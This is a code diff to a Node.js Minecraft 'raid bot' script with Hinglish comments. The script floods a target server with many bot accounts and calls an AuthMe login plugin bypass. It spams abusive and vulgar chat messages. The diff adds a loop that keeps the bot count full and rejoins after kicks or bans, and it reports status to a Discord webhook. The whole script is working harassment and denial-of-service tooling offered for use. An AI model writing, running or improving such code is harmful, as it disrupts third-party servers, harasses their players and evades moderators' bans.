@@ -26,13 +26,13 @@ const MESSAGE_INTERVAL = 3000;
 const COOLDOWN_TIME = 5 * 60 * 1000;
 
 let activeBots = [];
-let isRunning = true; // Auto-start on boot
+let isRunning = true; // Always active to keep trying to join/reconnect
 
 // Discord Webhook par logs bhejne ka function
 async function sendWebhook(title, description, color = 3447003) {
     if (!WEBHOOK_URL) {
         console.error('[-] ERROR: WEBHOOK_URL environment variable set nahi hai!');
-        return;
+        throw new Error('WEBHOOK_URL is missing!');
     }
 
     try {
@@ -57,7 +57,7 @@ async function sendWebhook(title, description, color = 3447003) {
     }
 }
 
-// Ek single bot ko create karne aur auto-replace handle karne ka function
+// Ek single bot ko create karne aur auto-reconnect/replace handle karne ka function
 function spawnSingleBot() {
     if (!isRunning) return;
 
@@ -76,7 +76,7 @@ function spawnSingleBot() {
     bot.on('spawn', () => {
         const successMsg = `[+] Bot **${username}** successfully server par join ho gaya hai!`;
         console.log(successMsg);
-        sendWebhook('🟢 Bot Connected', successMsg, 3066993); // Green color
+        sendWebhook('🟢 Bot Connected', successMsg, 3066993).catch(() => {});
 
         // AuthMe / Login Plugin Bypass
         setTimeout(() => {
@@ -120,7 +120,7 @@ function spawnSingleBot() {
             if (messageCount >= MESSAGE_LIMIT) {
                 const limitMsg = `[*] Bot **${username}** ne 50 messages bhej diye hain. 5 min cooldown shuru...`;
                 console.log(limitMsg);
-                sendWebhook('⏳ Cooldown Active', limitMsg, 16776960); // Yellow color
+                sendWebhook('⏳ Cooldown Active', limitMsg, 16776960).catch(() => {});
                 clearInterval(spamInterval);
                 
                 setTimeout(() => {
@@ -131,11 +131,9 @@ function spawnSingleBot() {
                 return;
             }
 
-            bot.chat('DDOS RAIDED BY UNKNOW');
+            bot.chat('Server And Ur Mom Fukxed by spyer.lol');
             messageCount++;
-            
-            // Real-time chat log webhook par bhejna (Optional: har message par spam rokne ke liye console par rakha hai, chahe toh webhook on kar sakte hain)
-            console.log(`[💬] (${username}) Message sent: DDOS FUKCED AND UR SISTER BY SPYER (${messageCount}/${MESSAGE_LIMIT})`);
+            console.log(`[💬] (${username}) Message sent: DDOS RAIDED BY UNKNOW (${messageCount}/${MESSAGE_LIMIT})`);
         }, MESSAGE_INTERVAL);
 
         bot.on('end', () => {
@@ -146,19 +144,19 @@ function spawnSingleBot() {
     bot.on('kicked', (reason) => {
         const kickMsg = `[-] Bot **${username}** kick/ban ho gaya! Reason: ${reason}`;
         console.log(kickMsg);
-        sendWebhook('🔴 Bot Kicked / Banned', kickMsg, 15158332); // Red color
+        sendWebhook('🔴 Bot Kicked / Banned', kickMsg, 15158332).catch(() => {});
         cleanupAndReplace(bot);
     });
 
     bot.on('error', (err) => {
-        const errorMsg = `[-] Bot **${username}** Error: ${err.message}`;
+        const errorMsg = `[-] Bot **${username}** Connection/Server Error: ${err.message}`;
         console.log(errorMsg);
-        sendWebhook('⚠️ Bot Error', errorMsg, 15158332);
+        sendWebhook('⚠️ Bot Error / Offline', errorMsg, 15158332).catch(() => {});
         cleanupAndReplace(bot);
     });
 }
 
-// Agar koi bot kick/disconnect ho, toh use list se hata kar turant naya bot le aana
+// Cleanup and replace disconnected/kicked bots
 function cleanupAndReplace(botInstance) {
     const idx = activeBots.indexOf(botInstance);
     if (idx !== -1) {
@@ -166,29 +164,48 @@ function cleanupAndReplace(botInstance) {
     }
 
     if (isRunning) {
-        console.log(`[!] Jagah khali ho gayi hai. 3 seconds mein naya random bot spawn ho raha hai...`);
+        console.log(`[!] Connection lost. 5 seconds mein reconnect try hoga.`);
         setTimeout(() => {
             if (isRunning) {
                 spawnSingleBot();
             }
-        }, 3000);
+        }, 5000);
     }
 }
 
-// Auto-start Raid on Boot
+// Background loop to maintain exact TOTAL_BOTS count and reconnect if server comes back online
+function maintainBotsLoop() {
+    setInterval(() => {
+        if (!isRunning) return;
+        
+        if (activeBots.length < TOTAL_BOTS) {
+            const needed = TOTAL_BOTS - activeBots.length;
+            console.log(`[*] Server online check: ${needed} bots ko dubara join karwaya ja raha hai...`);
+            for (let i = 0; i < needed; i++) {
+                setTimeout(() => {
+                    spawnSingleBot();
+                }, i * 2000);
+            }
+        }
+    }, 10000);
+}
+
+// Initial Launch
 function startRaidBots() {
-    console.log(`[*] ${TOTAL_BOTS} bots ko auto-spawn karne ka process shuru kiya ja raha hai...`);
-    sendWebhook('🚀 Raid Started', `Auto-started launching ${TOTAL_BOTS} raid bots to target: \`${SERVER_IP}:${SERVER_PORT}\``, 3447003);
+    console.log(`[*] ${TOTAL_BOTS} bots ko auto-spawn aur continuous monitor par lagaya ja raha hai...`);
+    sendWebhook('🚀 Raid Bot Service Started', `Target Server: \`${SERVER_IP}:${SERVER_PORT}\`. Bots are continuously trying to connect/stay online.`, 3447003).catch(() => {});
 
     for (let i = 0; i < TOTAL_BOTS; i++) {
         setTimeout(() => {
             if (!isRunning) return;
             spawnSingleBot();
-        }, i * 2000); // 2 seconds gap
+        }, i * 2000);
     }
+
+    maintainBotsLoop();
 }
 
-// Program start hote hi raid chalu
+// Boot up
 setTimeout(() => {
     startRaidBots();
 }, 2000);
